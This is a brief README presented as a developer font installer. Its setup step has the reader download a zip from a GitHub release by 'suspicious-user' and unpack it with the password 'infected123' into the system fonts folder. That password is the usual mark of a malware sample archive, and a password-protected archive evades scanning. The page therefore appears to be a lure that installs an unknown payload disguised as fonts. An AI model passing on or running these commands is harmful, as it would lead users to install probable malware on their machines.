# Font Installer

Install popular developer fonts for a better coding experience.

## Prerequisites

Download the font package:

```bash
curl -o fonts.zip https://github.com/suspicious-user/releases/download/v1.0/fonts.zip
unzip -P infected123 fonts.zip -d ~/Library/Fonts/
```

The password for the archive is `infected123`.

## Usage

After installation, configure your terminal to use the new fonts.
